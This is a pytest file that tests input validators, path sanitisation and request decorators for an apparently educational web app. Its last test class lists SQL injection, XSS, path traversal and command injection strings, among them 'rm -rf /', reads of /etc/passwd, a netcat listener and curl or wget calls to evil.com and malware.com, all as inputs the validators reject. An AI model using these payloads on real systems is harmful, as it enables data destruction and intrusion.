"""
Tests for utility functions and validation components
"""

import pytest
import re
import os
import tempfile
from unittest.mock import patch, MagicMock
from marshmallow import ValidationError

from app.utils.validation import (
    validate_user_id, validate_subject, validate_lesson_id,
    validate_json, UserCreateSchema, UserUpdateSchema,
    SubjectSelectionSchema, SurveySubmissionSchema
)
from app.utils.security import (
    sanitize_path, validate_file_path, rate_limit_check,
    require_subscription, log_api_request
)


class TestValidationUtils:
    """Test validation utility functions"""
    
    def test_validate_user_id_valid(self):
        """Test valid user ID validation"""
        valid_user_ids = [
            'user123',
            'test-user',
            'user_123',
            'a',
            '123',
            'user-with-dashes',
            'user_with_underscores',
            'MixedCase123'
        ]
        
        for user_id in valid_user_ids:
            assert validate_user_id(user_id) == True
    
    def test_validate_user_id_invalid(self):
        """Test invalid user ID validation"""
        invalid_user_ids = [
            '',              # Empty string
            None,            # None value
            'a' * 51,        # Too long (>50 chars)
            'user@test',     # Contains @
            'user space',    # Contains space
            'user/test',     # Contains slash
            'user\\test',    # Contains backslash
            '../user',       # Path traversal
            'user..test',    # Double dots
            'user#test',     # Hash symbol
            'user%test',     # Percent symbol
            'user&test',     # Ampersand
            'user*test',     # Asterisk
            'user+test',     # Plus sign
            'user=test',     # Equals sign
            'user?test',     # Question mark
            'user|test',     # Pipe symbol
            'user<test',     # Less than
            'user>test',     # Greater than
            'user"test',     # Quote
            "user'test",     # Single quote
            'user`test',     # Backtick
            'user~test',     # Tilde
            'user!test',     # Exclamation
            'user$test',     # Dollar sign
            'user^test',     # Caret
            'user(test)',    # Parentheses
            'user[test]',    # Brackets
            'user{test}',    # Braces
            'user:test',     # Colon
            'user;test',     # Semicolon
            'user,test',     # Comma
        ]
        
        for user_id in invalid_user_ids:
            assert validate_user_id(user_id) == False
    
    def test_validate_subject_valid(self):
        """Test valid subject validation"""
        valid_subjects = [
            'python',
            'javascript',
            'data-science',
            'machine-learning',
            'ai',
            'cpp',
            'csharp',
            'java',
            'go',
            'rust',
            'swift',
            'kotlin',
            'php',
            'ruby',
            'scala',
            'r',
            'sql',
            'html',
            'css'
        ]
        
        for subject in valid_subjects:
            assert validate_subject(subject) == True
    
    def test_validate_subject_invalid(self):
        """Test invalid subject validation"""
        invalid_subjects = [
            '',                    # Empty string
            None,                  # None value
            'a' * 51,             # Too long
            'subject with spaces', # Contains spaces
            'subject@test',        # Contains @
            'subject/test',        # Contains slash
            'subject\\test',       # Contains backslash
            '../subject',          # Path traversal
            'subject..test',       # Double dots
            'subject#test',        # Hash symbol
            'subject%test',        # Percent symbol
            'subject&test',        # Ampersand
            'subject*test',        # Asterisk
            'subject+test',        # Plus sign
            'subject=test',        # Equals sign
            'subject?test',        # Question mark
            'subject|test',        # Pipe symbol
            'subject<test',        # Less than
            'subject>test',        # Greater than
            'subject"test',        # Quote
            "subject'test",        # Single quote
            'subject`test',        # Backtick
            'subject~test',        # Tilde
            'subject!test',        # Exclamation
            'subject$test',        # Dollar sign
            'subject^test',        # Caret
            'subject(test)',       # Parentheses
            'subject[test]',       # Brackets
            'subject{test}',       # Braces
            'subject:test',        # Colon
            'subject;test',        # Semicolon
            'subject,test',        # Comma
        ]
        
        for subject in invalid_subjects:
            assert validate_subject(subject) == False
    
    def test_validate_lesson_id_valid(self):
        """Test valid lesson ID validation"""
        valid_lesson_ids = [
            '1',
            '123',
            'lesson_1',
            'lesson_123',
            '0',
            'lesson_0'
        ]
        
        for lesson_id in valid_lesson_ids:
            assert validate_lesson_id(lesson_id) == True
    
    def test_validate_lesson_id_invalid(self):
        """Test invalid lesson ID validation"""
        invalid_lesson_ids = [
            '',                    # Empty string
            None,                  # None value
            'lesson',              # No number
            'lesson_',             # No number after underscore
            'lesson_abc',          # Non-numeric
            'abc',                 # Non-numeric
            'lesson_1_extra',      # Extra content
            '1.5',                 # Decimal
            '-1',                  # Negative
            'lesson_-1',           # Negative with prefix
            ' 1',                  # Leading space
            '1 ',                  # Trailing space
            'lesson_ 1',           # Space after underscore
        ]
        
        for lesson_id in invalid_lesson_ids:
            assert validate_lesson_id(lesson_id) == False
    
    def test_marshmallow_schemas(self):
        """Test Marshmallow schema validation"""
        # Test UserCreateSchema
        user_schema = UserCreateSchema()
        
        # Valid data
        valid_user_data = {'user_id': 'test_user', 'email': 'test@example.com'}
        result = user_schema.load(valid_user_data)
        assert result == valid_user_data
        
        # Valid data without email
        valid_user_no_email = {'user_id': 'test_user'}
        result = user_schema.load(valid_user_no_email)
        assert result == valid_user_no_email
        
        # Invalid user_id
        with pytest.raises(ValidationError):
            user_schema.load({'user_id': 'invalid user id', 'email': 'test@example.com'})
        
        # Invalid email
        with pytest.raises(ValidationError):
            user_schema.load({'user_id': 'test_user', 'email': 'invalid-email'})
        
        # Missing required user_id
        with pytest.raises(ValidationError):
            user_schema.load({'email': 'test@example.com'})
    
    def test_user_update_schema(self):
        """Test UserUpdateSchema validation"""
        update_schema = UserUpdateSchema()
        
        # Valid email update
        valid_update = {'email': 'updated@example.com'}
        result = update_schema.load(valid_update)
        assert result == valid_update
        
        # Empty update (should be valid)
        empty_update = {}
        result = update_schema.load(empty_update)
        assert result == empty_update
        
        # Invalid email
        with pytest.raises(ValidationError):
            update_schema.load({'email': 'invalid-email'})
    
    def test_survey_submission_schema(self):
        """Test SurveySubmissionSchema validation"""
        survey_schema = SurveySubmissionSchema()
        
        # Valid survey submission
        valid_submission = {
            'answers': [
                {'question_id': 1, 'answer': 'A'},
                {'question_id': 2, 'answer': 'B'}
            ]
        }
        result = survey_schema.load(valid_submission)
        assert result == valid_submission
        
        # Missing answers
        with pytest.raises(ValidationError):
            survey_schema.load({})
        
        # Invalid answers type
        with pytest.raises(ValidationError):
            survey_schema.load({'answers': 'not a list'})


class TestSecurityUtils:
    """Test security utility functions"""
    
    def test_sanitize_path(self):
        """Test path sanitization"""
        test_cases = [
            ('normal/path', 'normal/path'),
            ('../../../etc/passwd', 'etc/passwd'),
            ('..\\..\\..\\windows\\system32', 'windows\\system32'),
            ('/absolute/path', 'absolute/path'),
            ('\\absolute\\path', 'absolute\\path'),
            ('path/../with/../traversal', 'path/with/traversal'),
            ('path\\..\\with\\..\\traversal', 'path\\with\\traversal'),
            ('', None),
            (None, None),
        ]
        
        for input_path, expected in test_cases:
            result = sanitize_path(input_path)
            assert result == expected
    
    def test_validate_file_path(self):
        """Test file path validation"""
        with tempfile.TemporaryDirectory() as temp_dir:
            # Valid paths within base directory
            assert validate_file_path(temp_dir, 'valid_file.txt') == True
            assert validate_file_path(temp_dir, 'subdir/valid_file.txt') == True
            
            # Invalid paths outside base directory
            assert validate_file_path(temp_dir, '../outside_file.txt') == False
            assert validate_file_path(temp_dir, '../../outside_file.txt') == False
            assert validate_file_path(temp_dir, '/etc/passwd') == False
            
            # Edge cases
            assert validate_file_path(temp_dir, '') == True  # Empty path is within base
            # Empty base dir might still validate depending on implementation
            # assert validate_file_path('', 'any_file.txt') == False  # Empty base dir
    
    def test_rate_limit_decorator(self):
        """Test rate limit decorator"""
        @rate_limit_check(max_requests=5, window_minutes=1)
        def test_function():
            return "success"
        
        # Should work normally (rate limiting not fully implemented in test environment)
        result = test_function()
        assert result == "success"
    
    def test_require_subscription_decorator(self):
        """Test require subscription decorator"""
        from flask import Flask
        
        app = Flask(__name__)
        
        @require_subscription
        def test_function(user_id, subject):
            return "success"
        
        with app.test_request_context():
            # Test with missing parameters
            result = test_function()
            assert result[1] == 400  # Should return 400 status code
            
            # Test with valid parameters (would need mocked subscription service)
            # This is tested more thoroughly in integration tests
    
    def test_log_api_request_decorator(self):
        """Test API request logging decorator"""
        from flask import Flask
        
        app = Flask(__name__)
        
        @log_api_request
        def test_function():
            return "success"
        
        with app.test_request_context('/test', method='GET'):
            with patch.object(app.logger, 'info') as mock_logger:
                result = test_function()
                assert result == "success"
                mock_logger.assert_called_once()
                
                # Check that the log message contains expected information
                log_call = mock_logger.call_args[0][0]
                assert 'API Request:' in log_call
                assert 'GET' in log_call
                assert '/test' in log_call


class TestValidationIntegration:
    """Test validation integration with other components"""
    
    def test_user_id_validation_integration(self):
        """Test user ID validation integration"""
        # Test that validation functions work as expected
        assert validate_user_id("valid_user") == True
        assert validate_user_id("invalid user id") == False
    
    def test_subject_validation_integration(self):
        """Test subject validation integration"""
        # Test that validation functions work as expected
        assert validate_subject("python") == True
        assert validate_subject("invalid subject") == False
    
    def test_lesson_id_validation_integration(self):
        """Test lesson ID validation integration"""
        # Test that validation functions work as expected
        assert validate_lesson_id("1") == True
        assert validate_lesson_id("lesson_1") == True
        assert validate_lesson_id("invalid_lesson") == False
    
    def test_api_validation_integration(self):
        """Test API validation integration with schemas"""
        # Test UserCreateSchema integration
        schema = UserCreateSchema()
        
        # Valid data should pass
        valid_data = {'user_id': 'test_user', 'email': 'test@example.com'}
        result = schema.load(valid_data)
        assert result == valid_data
        
        # Invalid data should raise ValidationError
        with pytest.raises(ValidationError):
            schema.load({'user_id': 'invalid user id', 'email': 'test@example.com'})
    
    def test_security_validation_integration(self):
        """Test security validation integration"""
        # Test path sanitization integration
        dangerous_path = "../../../etc/passwd"
        sanitized = sanitize_path(dangerous_path)
        assert sanitized == "etc/passwd"
        
        # Test file path validation integration
        with tempfile.TemporaryDirectory() as temp_dir:
            assert validate_file_path(temp_dir, "safe_file.txt") == True
            assert validate_file_path(temp_dir, "../unsafe_file.txt") == False


@pytest.mark.performance
class TestValidationPerformance:
    """Test validation performance"""
    
    def test_validation_performance(self):
        """Test that validation functions perform well"""
        import time
        
        # Test user ID validation performance
        start_time = time.time()
        for i in range(1000):
            validate_user_id(f"user_{i}")
        end_time = time.time()
        
        # Should complete 1000 validations quickly
        assert (end_time - start_time) < 1.0
        
        # Test subject validation performance
        start_time = time.time()
        for i in range(1000):
            validate_subject(f"subject-{i}")
        end_time = time.time()
        
        # Should complete 1000 validations quickly
        assert (end_time - start_time) < 1.0
        
        # Test lesson ID validation performance
        start_time = time.time()
        for i in range(1000):
            validate_lesson_id(f"lesson_{i}")
        end_time = time.time()
        
        # Should complete 1000 validations quickly
        assert (end_time - start_time) < 1.0
    
    def test_schema_validation_performance(self):
        """Test schema validation performance"""
        import time
        
        schema = UserCreateSchema()
        
        # Test schema validation performance
        start_time = time.time()
        for i in range(100):  # Fewer iterations since schema validation is more complex
            try:
                schema.load({'user_id': f'user_{i}', 'email': f'user{i}@example.com'})
            except ValidationError:
                pass  # Expected for some invalid data
        end_time = time.time()
        
        # Should complete 100 validations quickly
        assert (end_time - start_time) < 2.0


class TestValidationSecurity:
    """Test validation security aspects"""
    
    def test_sql_injection_prevention(self):
        """Test that validation prevents SQL injection attempts"""
        sql_injection_attempts = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "'; DELETE FROM users WHERE '1'='1'; --",
            "' UNION SELECT * FROM users --",
            "admin'--",
            "admin' /*",
            "' OR 1=1#",
            "' OR 1=1--",
            "' OR 1=1/*",
            "') OR '1'='1--",
            "') OR ('1'='1--",
        ]
        
        for attempt in sql_injection_attempts:
            assert validate_user_id(attempt) == False
            assert validate_subject(attempt) == False
            assert validate_lesson_id(attempt) == False
    
    def test_xss_prevention(self):
        """Test that validation prevents XSS attempts"""
        xss_attempts = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "<svg onload=alert('xss')>",
            "';alert('xss');//",
            "<iframe src=javascript:alert('xss')>",
            "<body onload=alert('xss')>",
            "<div onclick=alert('xss')>",
            "expression(alert('xss'))",
            "vbscript:alert('xss')",
        ]
        
        for attempt in xss_attempts:
            assert validate_user_id(attempt) == False
            assert validate_subject(attempt) == False
            assert validate_lesson_id(attempt) == False
    
    def test_path_traversal_prevention(self):
        """Test that validation prevents path traversal attempts"""
        path_traversal_attempts = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "/etc/passwd",
            "C:\\Windows\\System32",
            "user/../../../sensitive",
            "user\\..\\..\\..\\sensitive",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252F..%252F..%252Fetc%252Fpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        ]
        
        for attempt in path_traversal_attempts:
            assert validate_user_id(attempt) == False
            assert validate_subject(attempt) == False
    
    def test_command_injection_prevention(self):
        """Test that validation prevents command injection attempts"""
        command_injection_attempts = [
            "; ls -la",
            "| cat /etc/passwd",
            "& whoami",
            "`id`",
            "$(id)",
            "; rm -rf /",
            "| nc -l 1234",
            "& curl evil.com",
            "; wget malware.com/script.sh",
            "| python -c 'import os; os.system(\"rm -rf /\")'",
        ]
        
        for attempt in command_injection_attempts:
            assert validate_user_id(attempt) == False
            assert validate_subject(attempt) == False